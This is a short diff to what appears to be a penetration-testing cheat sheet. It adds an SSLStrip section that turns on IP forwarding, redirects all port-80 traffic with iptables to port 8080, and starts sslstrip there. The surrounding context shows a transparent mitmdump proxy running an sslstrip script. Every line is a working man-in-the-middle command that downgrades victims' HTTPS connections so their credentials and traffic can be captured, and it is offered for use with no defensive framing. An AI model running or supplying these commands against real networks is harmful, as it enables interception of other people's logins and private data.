@@ -68,3 +68,8 @@ Create SSL Certificate with LetsEncrypt----<a href="https://certbot.eff.org/lets
 
 ##MitMdump
 Transparent mitm proxy----mitmdump --mode transparent -s sslstrip.py
+
+##SSLStrip
+Turn on IP forwarding to allow forward of packets----echo "1" > /proc/sys/net/ipv4/ip_forward
+Redirect all HTTP (TCP/80) traffic to the SSLStrip process listening on port 8080----iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+Start SSLSTrip on TCP/8080----sslstrip -l 8080
